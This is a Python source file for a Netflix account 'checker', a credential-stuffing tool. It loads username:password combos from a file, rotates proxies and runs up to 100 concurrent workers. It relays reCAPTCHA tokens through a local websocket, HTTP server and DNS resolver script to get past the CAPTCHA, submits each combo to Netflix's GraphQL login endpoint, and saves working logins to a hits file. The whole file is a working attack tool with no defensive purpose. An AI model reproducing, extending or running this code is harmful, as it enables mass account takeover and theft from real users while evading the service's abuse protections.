import httpx
import json
import random
import asyncio
import os
import sys
from colorama import Fore, init
import datetime
import asyncio
import json
import subprocess
from websockets.asyncio.server import serve
from websockets.exceptions import ConnectionClosedOK
from websockets.asyncio.server import ServerConnection
from pathlib import Path

init(autoreset=True)

stop_event = asyncio.Event()
TOKEN_EVENT = asyncio.Event()
LOCK = asyncio.Lock()
COMBOS = asyncio.Queue()

SESSIONS = {}  # Store sessions by proxy
SESSION_LOCK = asyncio.Lock()

async def extract_initial_cookies(client):
    """Extract initial cookies before login"""
    try:
        # Visit Netflix main page to get initial cookies
        response = await client.get("https://www.netflix.com")
        cookies = {}
        for cookie in client.cookies.jar:
            cookies[cookie.name] = cookie.value
        return cookies
    except Exception as e:
        return {}




websocket_client = None
TOKEN = ""
checked = 0
hits = 0
PROXIES = []
HOST = "localhost"
PORT = 3001
DNS_PATH = "dns_resolver.py"
HTML_DIR = "./www"
HTTP_PORT = 80


hits_filename = Path("hits").joinpath(datetime.datetime.now().strftime(f"%d-%m-%Y %H;%M;%S") + ".txt")



async def netflix_thread(PROXIES, COMBOS: asyncio.Queue, verbose):

    global checked, hits, TOKEN, websocket_client
    while True:
        try:
            combo = COMBOS.get_nowait()  # non-blocking
        except asyncio.QueueEmpty:
            break  # exit if queue is empty
        try:
            username, password = combo.split(":", 1)
        except Exception:
            print(Fore.RED + f"[FAIL] {combo} | bad combo format")
            async with LOCK:
                checked += 1
            COMBOS.task_done()
            continue

        proxy_url = None
        if PROXIES:
            proxy_url = build_proxy_url(random.choice(PROXIES))
        headers = {"Accept": "application/json"}
        async with httpx.AsyncClient(
            proxy=proxy_url, timeout=30, verify=False, headers=headers
        ) as client:

            res = await client.get(
                "https://geolocation.onetrust.com/cookieconsentpub/v1/geo/location"
            )

            country_iso_code = safe_json(res).get("country")

            res = await client.get(
                f"https://restcountries.com/v3.1/alpha/{country_iso_code}"
            )
            country_data = safe_json(res)
            if country_data and len(country_data) > 0:
                idd = country_data[0].get("idd")
                country_code = idd.get("root") + idd.get("suffixes")[0]
            else:
                country_code = "US"
            async with LOCK:
                await websocket_client.send(json.dumps({"action": "send"}))
            await TOKEN_EVENT.wait()
            async with LOCK:
                recaptcha = TOKEN
            payload = {
                "operationName": "CLCSScreenUpdate",
                "variables": {
                    "format": "HTML",
                    "imageFormat": "PNG",
                    "locale": f"en-{country_iso_code}",
                    "serverState": '{"realm":"growth","name":"LOGIN","clcsSessionId":"603d0ad3-3efb-4b43-aba3-1451ce8af7a7","sessionContext":{"session-breadcrumbs":{"funnel_name":"loginWeb"}}}',
                    "serverScreenUpdate": '{"realm":"custom","name":"login.with.userLoginId.and.password","metadata":{"recaptchaSiteKey":"6Lf8hrcUAAAAAIpQAFW2VFjtiYnThOjZOA5xvLyR"},"loggingAction":"Submitted","loggingCommand":"SubmitCommand","referrerRenditionId":"69c7d5b5-bc42-4425-b451-00b8399f1fe4"}',
                    "inputFields": [
                        {
                            "name": "userLoginId",
                            "value": {"stringValue": username},
                        },
                        {"name": "password", "value": {"stringValue": password}},
                        {"name": "countryCode", "value": {"stringValue": country_code}},
                        {
                            "name": "countryIsoCode",
                            "value": {"stringValue": country_iso_code},
                        },
                        {"name": "recaptchaResponseTime", "value": {"intValue": random.randint(100,500)}},
                        {
                            "name": "recaptchaResponseToken",
                            "value": {"stringValue": recaptcha},
                        },
                    ],
                },
                "extensions": {
                    "persistedQuery": {
                        "id": "75fbc994-0c3b-462c-8558-f73fd869e5b9",
                        "version": 102,
                    }
                },
            }
            headers = {"Content-Type": "application/json", "Accept": "application/json"}

            try:
                result = await client.post(
                    "https://web.prod.cloud.netflix.com/graphql",
                    headers=headers,
                    json=payload,
                )
                raw = safe_json(result)
                all_text = str(raw)

                if (
                    ("Incorrect password " not in all_text)
                    and ("alert-message-header" not in all_text)
                    and ("sign in" not in all_text)
                ):
                    
                    if verbose:
                        print(Fore.GREEN + f"[+] login successful with {combo}  !")
                    else :
                        print(Fore.GREEN + "[+] login successful  !")
                    save_hit(username, password)
                    async with LOCK:
                        checked += 1
                        hits += 1
                elif verbose:
                    print(Fore.RED + f"[!] login failed with {combo}  !")
                    async with LOCK:
                        checked += 1
                else:
                    async with LOCK:
                        checked += 1
            except httpx.RequestError:
                async with LOCK:
                    print(Fore.RED + f"[FAIL] {combo} [retrying...]")
                continue
            finally:
                COMBOS.task_done()


def save_hit(username, password):
    with open(hits_filename, "a", encoding="utf-8") as f:
        f.write(f"{username}:{password}\n")


def safe_json(res):
    try:
        return res.json()
    except Exception:
        return None


def build_proxy_url(line: str):
    """
    Normalize common proxy formats to a URL usable by httpx.
    Examples accepted:
      - ip:port
      - ip:port:user:pass
      - user:pass@ip:port
      - http://..., https://..., socks5://...
    Returns a string or None if it can't normalize.
    """
    if not line:
        return None
    line = line.strip()
    if line.startswith(("http://", "https://", "socks4://", "socks5://")):
        return line
    if "@" in line and ":" in line:
        return "http://" + line if not line.startswith("http") else line
    parts = line.split(":")
    if len(parts) == 2:
        host, port = parts
        return f"http://{host}:{port}"
    if len(parts) == 4:
        host, port, user, pwd = parts
        return f"http://{user}:{pwd}@{host}:{port}"
    return None


async def checker():
    global PROXIES, COMBOS
    await asyncio.sleep(1)
    print(
        r"""
    _        _______ _________ _______           _______  _______  _        _______  _______ 
    ( (    /|(  ____ \\__   __/(  ____ \|\     /|(  ____ \(  ____ \| \    /\(  ____ \(  ____ )
    |  \  ( || (    \/   ) (   | (    \/| )   ( || (    \/| (    \/|  \  / /| (    \/| (    )|
    |   \ | || (__       | |   | |      | (___) || (__    | |      |  (_/ / | (__    | (____)|
    | (\ \) ||  __)      | |   | |      |  ___  ||  __)   | |      |   _ (  |  __)   |     __)
    | | \   || (         | |   | |      | (   ) || (      | |      |  ( \ \ | (      | (\ (   
    | )  \  || (____/\   | |   | (____/\| )   ( || (____/\| (____/\|  /  \ \| (____/\| ) \ \__
    |/    )_)(_______/   )_(   (_______/|/     \|(_______/(_______/|_/    \/(_______/|/   \__/
                                                                            
        Netflix [1]         (comming soon...) by ahmed mbarek


"""
    )

    if not os.path.isfile("combos.txt"):
        print(
            Fore.RED
            + f"[!] Missing combos.txt in current folder. Create it and add combos username:password per line."
        )
        sys.exit(0)

    CHECKER_TYPE = input("> ")

    while CHECKER_TYPE not in ["1"]:
        print(Fore.YELLOW + "[!] command is not found !")
        CHECKER_TYPE = input("> ")
    CHECKER_TYPE = int(CHECKER_TYPE)

    use_proxies = input("[*] Use proxies? (Y/N): ").strip().upper() == "Y"

    if use_proxies:
        if os.path.isfile("proxies.txt"):
            with open("proxies.txt", "r", encoding="utf-8") as f:
                PROXIES = [line.strip() for line in f if line.strip()]
        else:
            print(
                Fore.RED + "[!] no proxies available, try adding proxies in proxies.txt"
            )
            print(
                Fore.RED + "or you can continue without a proxy so using your (IP/VPN):"
            )
            if input("[*] continue (Y/N): ").strip().upper() != "Y":
                sys.exit(1)

    if not PROXIES:
        print(Fore.YELLOW + "[+] Proxyless mode enabled (using your IP/VPN).")

    try:
        THREADS_COUNT = int(input("threads [default:100]: ") or 100)
    except:
        THREADS_COUNT = 100
    verbose = input("you want to use verbose mode (Y/N) : ").strip().upper() == "Y"

    with open("combos.txt", "r", encoding="utf-8") as f:
        for line in f:
            if line.strip():
                await COMBOS.put(line.strip())

    combos_size = COMBOS.qsize()

    match (CHECKER_TYPE):
        case 1:
            tasks = [
                asyncio.create_task(netflix_thread(PROXIES, COMBOS, verbose))
                for _ in range(THREADS_COUNT)
            ]
            await COMBOS.join()  # wait for all combos to be processed

    print(Fore.CYAN + f"Done!,  Checked {checked}/{combos_size} | Hits={hits}")
    stop_event.set()


async def websocket_main():
    async with serve(handle_client, HOST, PORT):
        print(f"🚀 WebSocket server running on ws://{HOST}:{PORT}")

        # Start both subprocesses concurrently
        dns_task = asyncio.create_task(run_dns_resolver())
        http_task = asyncio.create_task(run_http_server())

        await stop_event.wait()  # wait for signal

        await asyncio.gather(dns_task, http_task)


async def run_dns_resolver():
    """Run dns_resolver.py as a subprocess."""
    process = await asyncio.create_subprocess_exec(
        "python",
        DNS_PATH,
        stdout=asyncio.subprocess.DEVNULL,
        stderr=asyncio.subprocess.DEVNULL,
    )
    print(f"🧩 Started process: {DNS_PATH} (pid={process.pid})")


async def run_http_server():
    """Run a simple HTTP server to serve ./html/"""
    process = await asyncio.create_subprocess_exec(
        "python",
        "-m",
        "http.server",
        str(HTTP_PORT),
        "--directory",
        HTML_DIR,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    print(f"🌐 HTTP server running at http://localhost:{HTTP_PORT} (pid={process.pid})")


async def handle_client(websocket: ServerConnection):
    global websocket_client, TOKEN
    websocket_client = websocket
    print("🔗 Client connected")
    try:
        async for message in websocket:
            try:
                data = json.loads(message)
                recaptcha = data.get("token")
                if recaptcha:
                    async with LOCK:
                        TOKEN = recaptcha
                        TOKEN_EVENT.set()
            except json.JSONDecodeError:
                ...
    except ConnectionClosedOK:
        print("🔌 Client disconnected gracefully")
    except Exception as e:
        print(f"⚠️ Unexpected error: {e}")


async def main():
    await asyncio.gather(websocket_main(), checker())


if __name__ == "__main__":
    asyncio.run(main())
